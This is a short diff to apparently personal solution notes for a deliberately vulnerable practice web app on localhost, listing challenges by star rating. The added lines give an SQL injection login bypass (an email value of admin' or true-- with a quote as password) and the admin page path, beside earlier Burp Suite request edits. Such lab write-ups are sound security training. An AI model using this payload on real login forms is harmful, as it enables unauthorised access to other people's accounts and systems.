@@ -37,3 +37,12 @@ burp proxy > repeater > rating:0<br><br>
 ### Repetitive Registration<br>
 http://localhost:3000/#/register<br>
 burp proxy > repeater > passwordRepeat:""<br><br>
+
+## 2 STAR
+### Login Admin<br>
+http://localhost:3000/#/login<br>
+email:admin' or true--<br>
+password:'<br><br>
+
+### Admin Section<br>
+http://localhost:3000/#/administration<br><br>
